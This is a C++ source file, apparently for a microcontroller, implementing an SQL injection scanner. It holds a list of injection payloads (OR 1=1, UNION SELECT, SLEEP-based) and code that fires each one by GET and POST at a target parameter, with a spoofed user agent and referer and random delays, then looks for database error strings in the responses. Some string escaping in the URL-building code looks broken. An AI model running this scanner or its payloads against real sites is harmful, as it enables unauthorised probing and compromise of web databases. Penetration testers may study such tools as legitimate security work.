// sql_injection_scanner.cpp
#include "sql_injection_scanner.h"

// Basic SQL Injection Payloads (can be expanded)
const std::vector<String> default_sql_payloads = {
    "\\'", "\"", "\\' OR 1=1 -- ", "\" OR 1=1 -- ", "\\' OR \'1\'=\'1\"", "\" OR \"1\"=\"1\"",
    "1\\' ORDER BY 1-- ", "1\\' ORDER BY 100-- ", // Basic ORDER BY for column count
    "\\' UNION SELECT NULL -- ", "\\' UNION SELECT NULL, NULL -- ", "\\' UNION SELECT NULL, NULL, NULL -- ", // Basic UNION based
    "AND 1=1", "AND 1=0",
    "\\' AND 1=1#", "\\' AND 1=0#",
    "admin\\'--", "admin\\' #", "admin\\'/*",
    "\\' OR SLEEP(5)--", "\" OR SLEEP(5)--" // Time-based, harder to detect reliably without good timing
};

SQLInjectionScanner::SQLInjectionScanner() {
    // Constructor
}

String SQLInjectionScanner::constructUrlWithPayload(String baseUrl, String paramName, String payload) {
    String queryChar = (baseUrl.indexOf(\"?\") == -1) ? \"?\" : \"&\";
    String encodedPayload = payload;
    encodedPayload.replace(" ", "%20");
    encodedPayload.replace("#", "%23");
    encodedPayload.replace("=", "%3D");
    encodedPayload.replace("+", "%2B");
    return baseUrl + queryChar + paramName + "=" + encodedPayload;
}

String SQLInjectionScanner::constructPostDataWithPayload(String paramName, String payload) {
    String encodedPayload = payload;
    encodedPayload.replace(" ", "%20");
    encodedPayload.replace("#", "%23");
    encodedPayload.replace("=", "%3D");
    encodedPayload.replace("+", "%2B");
    return paramName + "=" + encodedPayload;
}

// Updated sendRequestWithPayload to use WebExploitSettings
String SQLInjectionScanner::sendRequestWithPayload(String targetUrl, String paramName, String payload, bool isPost, const WebExploitSettings& settings) {
    String urlOrData;
    String response = "";

    if (isPost) {
        urlOrData = constructPostDataWithPayload(paramName, payload);
        http.begin(targetUrl);
    } else {
        urlOrData = constructUrlWithPayload(targetUrl, paramName, payload);
        http.begin(urlOrData); // For GET, the full URL is constructed
    }

    http.setUserAgent(settings.currentUserAgent);
    if (!settings.currentReferer.isEmpty()) {
        http.addHeader("Referer", settings.currentReferer);
    }
    http.setFollowRedirects(HTTPC_STRICT_FOLLOW_REDIRECTS);
    http.setTimeout(10000); // 10 seconds timeout

    int httpCode = 0;
    if (isPost) {
        http.addHeader("Content-Type", "application/x-www-form-urlencoded");
        httpCode = http.POST(urlOrData);
    } else {
        httpCode = http.GET();
    }

    if (httpCode > 0) {
        response = http.getString();
    } else {
        response = "Error on HTTP request: " + http.errorToString(httpCode) + " for " + (isPost ? targetUrl : urlOrData);
    }
    http.end();
    return response;
}

String SQLInjectionScanner::checkResponseForSQLVulnerability(const String& responseContent, const String& payload) {
    if (responseContent.startsWith("Error on HTTP request:")) {
        return "";
    }
    for (const String& errorMsg : sql_error_indicators) {
        if (responseContent.indexOf(errorMsg) != -1) {
            return "Potential SQL Injection detected with payload: \'" + payload + "\'. Error indicator: \'" + errorMsg + "\' found in response.";
        }
    }
    return "";
}

// Updated beginTest to use WebExploitSettings
String SQLInjectionScanner::beginTest(String targetUrl, String targetParameter, const std::vector<String>& sqlPayloadsToUse, const WebExploitSettings& settings) {
    String results = "SQL Injection Scan Started.\nTarget: " + targetUrl + "\nParameter: " + targetParameter + "\n";
    results += "User-Agent: " + settings.currentUserAgent + "\n";
    if (!settings.currentReferer.isEmpty()) results += "Referer: " + settings.currentReferer + "\n";
    results += "Request Delay: " + String(settings.requestDelayMs) + "ms (Random: " + (settings.useRandomDelay ? "Yes" : "No") + ")\n";

    const std::vector<String>& current_payloads = sqlPayloadsToUse.empty() ? default_sql_payloads : sqlPayloadsToUse;

    if (targetParameter.isEmpty()) {
        results += "Error: Target parameter cannot be empty for SQL Injection scan.\n";
        return results;
    }

    results += "\n--- Testing SQLi Payloads (GET) ---\n";
    for (const String& payload : current_payloads) {
        results += "Testing GET with payload: " + payload + "\n";
        String responseContent = sendRequestWithPayload(targetUrl, targetParameter, payload, false, settings);
        if (responseContent.startsWith("Error on HTTP request:")){
            results += "  -> " + responseContent + "\n";
        } else {
            String finding = checkResponseForSQLVulnerability(responseContent, payload);
            if (!finding.isEmpty()) {
                results += "  -> " + finding + "\n";
            } else {
                results += "  -> No clear SQLi indicators found.\n";
            }
        }
        delay(settings.getEffectiveDelay());
    }

    results += "\n--- Testing SQLi Payloads (POST) ---\n";
    for (const String& payload : current_payloads) {
        results += "Testing POST with payload: " + payload + "\n";
        String responseContent = sendRequestWithPayload(targetUrl, targetParameter, payload, true, settings);
        if (responseContent.startsWith("Error on HTTP request:")){
            results += "  -> " + responseContent + "\n";
        } else {
            String finding = checkResponseForSQLVulnerability(responseContent, payload);
            if (!finding.isEmpty()) {
                results += "  -> " + finding + "\n";
            } else {
                results += "  -> No clear SQLi indicators found.\n";
            }
        }
        delay(settings.getEffectiveDelay());
    }

    results += "\nSQL Injection Scan Finished.\n";
    return results;
}

